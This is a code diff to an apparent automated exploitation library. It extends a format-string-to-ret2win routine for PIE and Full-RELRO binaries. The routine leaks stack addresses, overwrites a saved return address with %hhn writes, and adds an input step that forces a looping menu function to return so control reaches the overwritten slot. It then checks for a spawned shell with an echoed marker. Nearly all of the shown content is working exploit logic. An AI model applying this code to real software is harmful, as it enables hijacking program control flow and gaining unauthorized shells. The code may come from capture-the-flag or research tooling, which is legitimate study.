@@ -1260,8 +1260,9 @@ def canary_pie_ret2win(exe, workdir, *, canary_trigger=b"", canary_offset=None, 
 
 
 def format_ret2win(exe, workdir, *, win_off, target_bytes, fmt_offset=None, read_cap=255,
-                   gate_prefix: bytes = b"", base_argv=(), marker: bytes = b"LYKOS-FMT-9931",
-                   timeout: float = 10.0, mem_mb: int = 2048) -> dict:
+                   gate_prefix: bytes = b"", loop_exit: bytes = b"q\n", base_argv=(),
+                   marker: bytes = b"LYKOS-FMT-9931", timeout: float = 10.0,
+                   mem_mb: int = 2048) -> dict:
     """Format-string -> ret2win on a PIE + Full-RELRO target (GOT read-only, so a %n must hit a
     SAVED RETURN on the stack, not a GOT slot). Needs a LOOPING printf(user) sink: iteration 1 does a
     `%N$p` leak, iteration 2 does the `%hhn` write, then the function returns through the overwritten
@@ -1372,6 +1373,14 @@ def format_ret2win(exe, workdir, *, win_off, target_bytes, fmt_offset=None, read
                     p.stdin.write(gate_prefix + payload + b"\n")
                     p.stdin.flush()
                     time.sleep(0.2)
+                    # A menu-gated sink LOOPS: after the write the function is back at its prompt, so
+                    # the overwritten return has not fired yet. Nudge the loop to RETURN -- a
+                    # non-numeric trips the usual `if (scanf(...) != 1) return;` exit -- so control
+                    # passes through the overwritten slot. Harmless when the sink already returns.
+                    if loop_exit:
+                        p.stdin.write(loop_exit)
+                        p.stdin.flush()
+                        time.sleep(0.2)
                     p.stdin.write(b"echo " + marker + b"\n")   # a spawned shell evaluates this
                     p.stdin.flush()
                 except (BrokenPipeError, OSError):
